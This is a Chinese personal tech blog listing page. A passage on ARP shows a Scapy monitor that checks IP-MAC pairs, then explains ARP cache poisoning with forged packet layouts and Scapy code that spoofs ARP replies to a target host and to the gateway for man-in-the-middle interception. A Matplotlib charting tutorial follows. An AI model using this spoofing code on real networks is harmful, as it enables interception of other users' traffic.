<li>建立正确的IP地址和MAC地址的映射数据库</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">'scapy.runtime'</span>).setLevel(logging.ERROR)<span class="comment">#清除报错</span></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ARP_Table <span class="keyword">import</span> ARP_Table <span class="comment"># 导入合法的IP-MAC映射关系</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arp_monitor_callback</span><span class="params">(pkt)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> ARP <span class="keyword">in</span> pkt <span class="keyword">and</span> pkt[ARP].op <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">2</span>):<span class="comment">#找到ARP数据包中操作码为1（who-has）或者2（is-at）的数据包）</span></span><br><span class="line">		<span class="keyword">if</span> ARP_Table.get(pkg[ARP].psrc):</span><br><span class="line">			<span class="keyword">if</span> ARP_Table[pkt[ARP].psrc] == pkt[ARP].hwsrc:</span><br><span class="line">				print(<span class="string">'IP地址：&#123;0&#125; MAC地址：&#123;1&#125; 匹配'</span>.format(pkt[ARP].psrc,pkt[ARP].hwsrc))</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				print(<span class="string">'IP地址：&#123;0&#125; MAC地址：&#123;1&#125; 不匹配'</span>.format(pkt[ARP].psrc,pkt[ARP].hwsrc))</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			print(<span class="string">'IP地址：&#123;0&#125; MAC地址：&#123;1&#125; 未找到条码'</span>.format(pkt[ARP].psrc,pkt[ARP].hwsrc))</span><br><span class="line">	<span class="comment">#捕获数据包，通过arp_monitor_callback方法进行处理，filter过滤arp数据包，store=0，不保存数据，iface指定接口</span></span><br><span class="line">	sniff(prn=arp_monitor_callback,filter=<span class="string">'arp'</span>,store=<span class="number">0</span>,iface=<span class="string">'ens32'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="5、Scapy实现ARP的毒化攻击"><a href="#5、Scapy实现ARP的毒化攻击" class="headerlink" title="5、Scapy实现ARP的毒化攻击"></a>5、Scapy实现ARP的毒化攻击</h2><p>原理：</p>
<p><img src="https://i.loli.net/2019/08/30/zKlWci79yTHxwQG.png" alt="攻击之前.png"></p>
<p><img src="!%5B%E6%94%BB%E5%87%BB%E4%B9%8B%E5%90%8E.jpg%5D(https://i.loli.net/2019/08/30/rkwa8dRBtmoFWJT.jpg)" alt="攻击之后"></p>
<p>所以，只需要修改A中的ARP缓存表，将与B对应的MAC修改。<br />于是，发给A的ARP响应报文格式应为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">目的IP：A</span><br><span class="line">目的MAC：A</span><br><span class="line">源IP：B</span><br><span class="line">源MAC：C</span><br></pre></td></tr></table></figure>

<p>就能实现上图功能。<br />紧接着，如果B要发消息给A，那么A中的ARP表可能会调整回正确的，于是可以向B发送ARP报文，格式为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">目的IP：B</span><br><span class="line">目的MAC：B</span><br><span class="line">源IP：A</span><br><span class="line">源MAC：C</span><br></pre></td></tr></table></figure>

<p>这样，B发往A的数据包也会走向C了，A，B双方的通信都将被C截获。<br />通常，B往往是路由器，所以B的IP地址一般是默认网关。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">	源IP为默认网关的IP</span></span><br><span class="line"><span class="string">	源MAC为默认网关的MAC</span></span><br><span class="line"><span class="string">	目的IP为需要毒化主机的IP</span></span><br><span class="line"><span class="string">	目的MAC为需要毒化主机的MAC</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">pkgtoHost=Ether(src=localmac,dst=tgmac)/ARP(op=<span class="number">2</span>,hwsrc=localmac,psrc=gatewayip,hwdst=tgmac,pdst=tgip)</span><br><span class="line">gatewayMac=getmacbyip(gatewayip)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">	源IP为被攻击主机的IP</span></span><br><span class="line"><span class="string">	源MAC为本机MAC</span></span><br><span class="line"><span class="string">	目的IP为默认网关的IP</span></span><br><span class="line"><span class="string">	目的MAC为默认网关的MAC</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">pkgtoGateway=Ether(src=localmac,dst=gatewayMac)/ARP(hwdst=gatewayMac,pdst=gatewayip,psrc=tgip,hwsrc=localmac,op=<span class="number">2</span>)</span><br></pre></td></tr></table></figure>




<h2 id="源码：-1"><a href="#源码：-1" class="headerlink" title="源码："></a>源码：</h2><blockquote>
<p><a href="https://github.com/ArchKS/Python/tree/master/ArpSpoof" target="_blank" rel="noopener">https://github.com/ArchKS/Python/tree/master/ArpSpoof</a></p>
</blockquote>

            
            <p class="more">
                <a href="../../http:/ymlog.cn/2019/07/27/Python%E5%AE%9E%E7%8E%B0ARP%E6%AC%BA%E9%AA%97%E5%B1%8F%E8%94%BD%E5%B1%80%E5%9F%9F%E7%BD%91/">阅读剩下更多</a>
            </p>
        </div>
        <div class="post-thumbnail" data-img="">
            <a href="http://ymlog.cn/2019/07/27/Python%E5%AE%9E%E7%8E%B0ARP%E6%AC%BA%E9%AA%97%E5%B1%8F%E8%94%BD%E5%B1%80%E5%9F%9F%E7%BD%91/" title="Python实现ARP欺骗屏蔽局域网">
                
                    <img class="thumbnail" src="../../img/default.png" data-echo="../../img/thumbnail/7.jpg" alt="默认配图" >
                
            </a>
        </div>
    </div>
</article>

    
        <!-- 文章列表 item -->
<article class="post">
    <header>
        <!-- 标签这有且只能显示一个 -->
        
        <a class="cat-link" href="">编程</a>
        
        <!-- 文章标题 -->
        
    <h3 class="post-title">
    	<a href="../../http:/ymlog.cn/2019/05/03/Matplotlib%E5%9B%BE%E6%A0%87%E7%BB%98%E5%88%B6%E6%91%98%E8%A6%81/">
    		Matplotlib图标绘制摘要
    	</a>
    </h3>

    </header>
    <p class="post-meta">
        Jelon 发表于
        <time datetime="2019-05-03T00:18:25.000Z">2019-05-03</time>
        &nbsp;&nbsp;
        <span class="post-tags">
            标签：
            
        </span>
    </p>

    <div class="post-content">
        <div class="post-excerpt">
            
                <p>目录</p>
<p>散点图：用于描述两个变量的相关性—–scatter<br>折线图：多用于描述变量随时间的变化—–plot<br>条形图:比较多个项目分类的数据大小<br>直方图：表示数据的分布情况（连续）<br>饼状图：显示各项大小与总和的比例<br>箱型图：上边缘，上四分位数，中位数，下四分位数，下边缘，异常值</p>
<hr>
<h1 id="散点图：用于描述两个变量的相关性—–scatter"><a href="#散点图：用于描述两个变量的相关性—–scatter" class="headerlink" title="散点图：用于描述两个变量的相关性—–scatter"></a>散点图：用于描述两个变量的相关性—–scatter</h1><p>scatter(x, y, s=None, c=None, marker=None, cmap=None, norm=None,vmin=None, vmax=None,alpha=None, linewidths=None, verts=None,edgecolors=None, <em>, data=None, *</em>kwargs)</p>
<pre><code>import numpy as np
import matplotlib.pyplot as plt

#随机正相关
m=np.random.randn(1000)
n=m+np.random.randn(1000)*0.5
plt.scatter(m,n)
plt.show()</code></pre><p><img src="https://img-blog.csdnimg.cn/20190502085417215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="随机正相关散点图"></p>
<pre><code>import numpy as np
import matplotlib.pyplot as plt

#随机不相关
x=np.random.randn(1000)
y=np.random.randn(1000)

plt.scatter(x,y)
plt.show()</code></pre><p><img src="https://img-blog.csdnimg.cn/20190502085354320.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="随机不相关散点图"></p>
<p>界面定制：  </p>
<pre><code>#s:点的面积
#c：颜色
#marker：标志形状
#alpha：透明度

plt.scatter(x,y,s=100,c=&apos;r&apos;,marker=&apos;X&apos;,alpha=0.5)

#marker的种类：https://matplotlib.org/api/markers_api.html?highlight=marker#module-matplotlib.markers</code></pre><p>折线图：多用于描述变量随时间的变化—–plot</p>
<p>def plot_date(x, y, fmt=’o’, tz=None, xdate=True, ydate=False, <em>,data=None, *</em>kwargs)</p>
<pre><code>#def plot(*args, scalex=True, scaley=True, data=None, **kwargs)
import numpy as np
import matplotlib.pyplot as plt
#折线图
#生成从-10~10平均等分的100个数
x=np.linspace(-10,10,100)
y=x**2
plt.plot(x,y)
plt.show()</code></pre><p><img src="https://img-blog.csdnimg.cn/2019050208582070.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="折线图"></p>
<p>文件中有日期的折线图：</p>
<p>1、converters={0:mdate.strpdate2num(‘%Y’)}</p>
<p>2、plt.plot_date()</p>
<pre><code>import numpy as np
import matplotlib.pyplot as plt
import matplotlib.dates as mdate

#北京房价折线图
date,beijing,tianjing,shijiazhuang=np.loadtxt(&apos;demo.csv&apos;,delimiter=&apos;,&apos;,converters={0:mdate.strpdate2num(&apos;%Y&apos;)},skiprows=1,usecols=(0,1,2,3),unpack=True,encoding=&apos;GBK&apos;)


#skiprows:从第几行开始导入
#usecols:导入第几列
#unpack:False-从左往右形成一行，True-从上往下形成一行
#delimiter:csv中每个数据的分隔符


plt.plot_date(date,beijing,linestyle=&apos;-&apos;,marker=&apos;o&apos;,color=&apos;red&apos;)
plt.plot_date(date,tianjing,linestyle=&apos;-&apos;,marker=&apos;o&apos;,color=&apos;blue&apos;)
plt.plot_date(date,shijiazhuang,linestyle=&apos;-&apos;,marker=&apos;o&apos;,color=&apos;black&apos;)

#linestyle:直线、虚线

plt.show()</code></pre><p><img src="https://img-blog.csdnimg.cn/20190502085955525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="北京房价折线图"></p>
<pre><code>import numpy as np
import matplotlib.pyplot as plt

#画出正弦函数的图像
x=np.linspace(-10,10,100)
y=np.sin(x)
plt.plot(x,y)
plt.show()</code></pre><p><img src="https://img-blog.csdnimg.cn/20190502090100362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="正弦函数图"></p>
<h1 id="条形图-比较多个项目分类的数据大小"><a href="#条形图-比较多个项目分类的数据大小" class="headerlink" title="条形图:比较多个项目分类的数据大小"></a>条形图:比较多个项目分类的数据大小</h1><pre><code>import numpy as np
import matplotlib.pyplot as plt
#def bar(x, height, width=0.8, bottom=None, *, align=&apos;center&apos;,data=None, **kwargs):
N=5
#并列
y=[22,55,33,42,60]
index=np.arange(N)
x=plt.bar(x=index,height=y,width=0.4,color=&apos;red&apos;)
plt.show()</code></pre><p><img src=".https://img-blog.csdnimg.cn/20190502162220657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="并列条形图"></p>
<pre><code>import numpy as np
import matplotlib.pyplot as plt
N=5
#并列
y=[22,55,33,42,60]
index=np.arange(N)
x=plt.barh(y=index,width=y,color=&apos;red&apos;)
plt.show()</code></pre><p><img src="https://img-blog.csdnimg.cn/20190502164231325.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="斜侧并列条形图"></p>
<pre><code>import numpy as np
import matplotlib.pyplot as plt
N=5
#并列
y1=[22,55,33,42,60]
y2=[21,20,45,10,54]
bar_width=0.3
index=np.arange(N)
plt.bar(x=index,height=y1,color=&apos;red&apos;,width=0.3)
plt.bar(x=index+bar_width,height=y2,color=&apos;blue&apos;,width=0.3)
plt.show()</code></pre><p> <img src="https://img-blog.csdnimg.cn/20190502164648339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="多列条形图"></p>
<pre><code>import numpy as np
import matplotlib.pyplot as plt
N=5

#层叠-就是将下层图像置为上层的buttom
y1=[22,55,33,42,60]
y2=[21,20,45,10,54]
index=np.arange(N)
plt.bar(index,y1,0.2,color=&apos;red&apos;)
plt.bar(index,y1,0.2,y1,color=&apos;blue&apos;)
#不能写x=index，height=y1等
plt.show()</code></pre><p><img src="https://img-blog.csdnimg.cn/20190502165636710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="单列多类条形图"></p>
<h1 id="直方图：表示数据的分布情况（连续）"><a href="#直方图：表示数据的分布情况（连续）" class="headerlink" title="直方图：表示数据的分布情况（连续）"></a>直方图：表示数据的分布情况（连续）</h1><pre><code>#直方图
import numpy as np
import matplotlib.pyplot as plt
mu=100 #mean of the distrubution
sigma=20 #standard deviation of distribution
x=np.random.randn(2000)
plt.hist(x,bins=10,color=&apos;red&apos;,density=False,edgecolor=&apos;k&apos;)
#bins：多少块
#density :是否标准化，标准化之后为频组
#edgecolor：颜色分割线

plt.show()</code></pre><p><img src="https://img-blog.csdnimg.cn/2019050217145746.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="直方图"></p>
<pre><code>#双变量直方图
import numpy as np
import matplotlib.pyplot as plt
x=np.random.randn(2000)+2
y=np.random.randn(2000)+3
plt.hist2d(x,y,bins=50)
plt.show()</code></pre><p><img src="https://img-blog.csdnimg.cn/20190502171739451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="双变量直方图"></p>
<h1 id="饼状图：显示各项大小与总和的比例"><a href="#饼状图：显示各项大小与总和的比例" class="headerlink" title="饼状图：显示各项大小与总和的比例"></a>饼状图：显示各项大小与总和的比例</h1><pre><code>#饼状图
import numpy as np
import matplotlib.pyplot as plt
labels=&apos;A&apos;,&apos;B&apos;,&apos;C&apos;,&apos;D&apos;
fraces=[15,30,25,10]
explode=[0,0,0,0.05]
plt.pie(x=fraces,labels=labels,autopct=&apos;%0.f%%&apos;,explode=explode,shadow=True)
#autopct:显示百分比
#explode:突出显示
#shadow:加阴影

plt.show()</code></pre><p><img src="https://img-blog.csdnimg.cn/20190503075210153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="饼图"></p>
<h1 id="箱型图：上边缘，上四分位数，中位数，下四分位数，下边缘，异常值"><a href="#箱型图：上边缘，上四分位数，中位数，下四分位数，下边缘，异常值" class="headerlink" title="箱型图：上边缘，上四分位数，中位数，下四分位数，下边缘，异常值"></a>箱型图：上边缘，上四分位数，中位数，下四分位数，下边缘，异常值</h1><pre><code>#箱型图
import numpy as np
import matplotlib.pyplot as plt
np.random.seed(1)
data=np.random.normal(size=1000,loc=0,scale=1)
plt.boxplot(data,sym=&apos;x&apos;,whis=1.5)
#sym:符号
#whis:异常值的区域
plt.show()</code></pre><p><img src="https://img-blog.csdnimg.cn/20190503081153899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="箱型图"></p>
<pre><code>#多箱型图
import numpy as np
import matplotlib.pyplot as plt
np.random.seed(1)
data=np.random.normal(size=(1000,4),loc=0,scale=1)
labels=[&apos;A&apos;,&apos;B&apos;,&apos;C&apos;,&apos;D&apos;]
plt.boxplot(data,sym=&apos;x&apos;,whis=1.5)
plt.show()</code></pre><p><img src="https://img-blog.csdnimg.cn/20190503081421727.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzc1NzAy,size_16,color_FFFFFF,t_70" alt="多箱型图"></p>

            
            <p class="more">
                <a href="../../http:/ymlog.cn/2019/05/03/Matplotlib%E5%9B%BE%E6%A0%87%E7%BB%98%E5%88%B6%E6%91%98%E8%A6%81/">阅读剩下更多</a>
            </p>
        </div>
        <div class="post-thumbnail" data-img="">
            <a href="http://ymlog.cn/2019/05/03/Matplotlib%E5%9B%BE%E6%A0%87%E7%BB%98%E5%88%B6%E6%91%98%E8%A6%81/" title="Matplotlib图标绘制摘要">
                
                    <img class="thumbnail" src="../../img/default.png" data-echo="../../img/thumbnail/3.jpg" alt="默认配图" >
                
            </a>
        </div>
    </div>
</article>

    

    
    <nav class="page-navigator">
        <span class="page-number current">1</span>
    </nav>
    


            </div>

        </section>
        <!-- 侧栏部分 -->
<aside class="sidebar">
    
    <section class="widget">
        <h3 class="widget-hd"><strong>文章搜索</strong></h3>
        <div class="search-form">
  <form
    id="searchForm"
    method="GET"
    action="https://www.baidu.com/s"
    ectype="application/x-www-form-urlencoded"
    target="_blank"
    autocomplete="false"
    onsubmit="javascript: return false;">
    <input
      id="searchKeyword"
      type="text"
      class="form-control"
      placeholder="输入关键字搜索"
      autocomplete="false"
    />
    <input id="searchKeywordHidden" type="hidden" name="wd" />
    <input id="searchButton" class="btn" type="submit" value="搜索" />
  </form>
</div>
    </section>
    

    <section class="widget">
        <h3 class="widget-hd"><strong>文章分类</strong></h3>
        <!-- 文章分类 -->
<ul class="widget-bd">
    
    <li>
        <a href="../%E4%B8%AD%E9%97%B4%E4%BB%B6/">中间件</a>
        <span class="badge">(3)</span>
    </li>
    
    <li>
        <a href="">编程</a>
        <span class="badge">(7)</span>
    </li>
    
    <li>
        <a href="../%E5%AE%B9%E5%99%A8/">容器</a>
        <span class="badge">(1)</span>
    </li>
    
    <li>
        <a href="../Linux/">Linux</a>
        <span class="badge">(7)</span>
    </li>
    
    <li>
        <a href="../%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a>
        <span class="badge">(2)</span>
    </li>
    
    <li>
        <a href="../%E8%B7%AF%E7%94%B1%E6%8A%80%E6%9C%AF/">路由技术</a>
        <span class="badge">(3)</span>
    </li>
    
    <li>
        <a href="../%E6%95%85%E9%9A%9C/">故障</a>
        <span class="badge">(1)</span>
    </li>
    
    <li>
        <a href="../%E8%BF%90%E7%BB%B4/">运维</a>
        <span class="badge">(1)</span>
    </li>
    
</ul>
    </section>

    
    <section class="widget">
        <h3 class="widget-hd"><strong>热门标签</strong></h3>
        <!-- 文章标签 -->
<div class="widget-bd tag-wrap">
  
    <a class="tag-item" href="../../tags/%E5%BF%AB%E6%8D%B7%E9%94%AE/" title="快捷键">快捷键 (6)</a>
  
    <a class="tag-item" href="../../tags/%E9%9A%8F%E7%AC%94/" title="随笔">随笔 (1)</a>
  
    <a class="tag-item" href="../../tags/%E6%91%98%E5%BD%95/" title="摘录">摘录 (1)</a>
  
</div>
    </section>
    

    

    
    <!-- 友情链接 -->
    <section class="widget">
        <h3 class="widget-hd"><strong>友情链接</strong></h3>
        <!-- 文章分类 -->
<ul class="widget-bd">
    
        <li>
            <a href="https://github.com/front-end-pigs/blog" target="_blank" title="Github博客">Github博客</a>
        </li>
    
</ul>
    </section>
    
</aside>
<!-- / 侧栏部分 -->
    </div>

    <!-- 博客底部 -->
    <footer class="footer">
    &copy;
    
        2016-2020
    

    <a href="../../index.html">Jelon Loves You</a>
</footer>
<div class="back-to-top" id="JELON__backToTop" title="返回顶部">返回顶部</div>

    <!--博客js脚本 -->
    <!-- 这里放网站js脚本 -->

<script src="../../js/main.js?v=1593076679065.js"></script>

</body>
</html>